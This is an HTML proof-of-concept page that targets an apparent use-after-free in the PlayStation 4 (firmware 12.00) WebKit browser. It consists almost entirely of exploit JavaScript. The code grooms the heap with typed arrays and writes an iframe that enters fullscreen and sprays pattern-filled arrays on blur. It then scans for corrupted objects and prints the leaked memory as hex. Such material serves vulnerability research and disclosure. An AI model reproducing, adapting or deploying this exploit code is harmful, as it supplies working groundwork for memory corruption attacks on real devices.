
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - Fullscreen Teardown UAF PoC</title>
    <style>
        body { background-color: #1a1a1a; color: #fff; font-family: monospace; padding: 20px; }
        button { padding: 15px; font-weight: bold; cursor: pointer; background: #e0e0e0; color: #000; border-radius: 5px; }
        #log-area { background: #000; color: #0f0; padding: 15px; border: 1px solid #333; height: 250px; overflow-y: scroll; display: none; margin-top: 20px;}
    </style>
</head>
<body>

    <h2>PlayStation 4 (FW 12.00) - WebKit Use-After-Free</h2>
    <p><b>Bug Type:</b> Memory Corruption via Fullscreen Teardown Race Condition</p>
    <p>Status: <span id="status" style="color: #ffeb3b;">Waiting for preparation...</span></p>

    <button onclick="prepareMemory()">1. Allocate Target Objects</button>
    <button onclick="injectTrigger()">2. Trigger Race Condition (Fullscreen -> Options)</button>
    <button onclick="verifyLeak()" style="background: #4caf50; color: #fff;">3. Verify Memory Corruption</button>

    <div id="log-area"></div>
    <div id="frame-container" style="margin-top: 20px;"></div>

    <script>
        const PATTERN = 2.121995791e-314; // 0x4141414141414141
        let controllers = [];
        const statusEl = document.getElementById('status');
        const logArea = document.getElementById('log-area');

        // Step 1: Heap Grooming
        function prepareMemory() {
            controllers = [];
            for(let i = 0; i < 5000; i++) {
                let arr = new Float64Array(8); // 64 bytes allocation
                arr[0] = i; 
                controllers.push(arr);
            }
            statusEl.innerText = "Target objects allocated in memory.";
        }

        // Step 2: Triggering the Teardown UAF
        function injectTrigger() {
            const container = document.getElementById('frame-container');
            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:2px dashed red;"></iframe>';
            const fDoc = document.getElementById('pocFrame').contentWindow.document;

            fDoc.open();
            fDoc.write(`
                <html><body style="background:#fff; text-align:center;">
                    <button onclick="startPoC()" style="padding:15px; background:#f44336; color:#fff; font-weight:bold;">ENTER FULLSCREEN</button>
                    <script>
                        window.startPoC = function() {
                            if (document.documentElement.webkitRequestFullscreen) 
                                document.documentElement.webkitRequestFullscreen();
                            
                            window.onblur = function() { // Triggered by pressing 'Options' button
                                let spray = [];
                                for(let i = 0; i < 8000; i++) {
                                    let p = new Float64Array(10);
                                    p.fill(${PATTERN});
                                    spray.push(p);
                                }
                                
                                setTimeout(() => {
                                    document.open();
                                    document.write('<h2 style="color:green;">TEARDOWN COMPLETE</h2>');
                                    document.close();
                                }, 1000);
                            };
                        };
                    <\/script>
                </body></html>
            `);
            fDoc.close();
            statusEl.innerText = "Iframe ready. Press Fullscreen, then press 'Options' button.";
        }

        // Step 3: Verification
        function verifyLeak() {
            let corrupted = null;
            let corruptedIndex = -1;

            for(let i = 0; i < controllers.length; i++) {
                if (controllers[i][0] !== i) { // Detects any overwrite
                    corrupted = controllers[i];
                    corruptedIndex = i;
                    break;
                }
            }

            logArea.style.display = "block";
            
            if (corrupted) {
                statusEl.innerHTML = "<span style='color:#4caf50;'>✓ VULNERABILITY CONFIRMED!</span>";
                logArea.innerHTML = "<b>[ MEMORY CORRUPTION DETECTED ]</b><br><br>";
                logArea.innerHTML += "Object ID " + corruptedIndex + " was overwritten after iframe teardown.<br>";
                logArea.innerHTML += "Gigacage zero-fill or pattern overlap confirmed.<br><br>";
                
                for(let i = 0; i < 8; i++) {
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = corrupted[i];
                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                    logArea.innerHTML += "Offset [" + i + "]: 0x" + hex + "<br>";
                }
            } else {
                statusEl.innerHTML = "<span style='color:#f44336;'>✗ No corruption. Please restart browser.</span>";
                logArea.innerHTML = "Race condition failed. The OS managed the memory correctly this time.";
            }
        }
    </script>
</body>
</html>
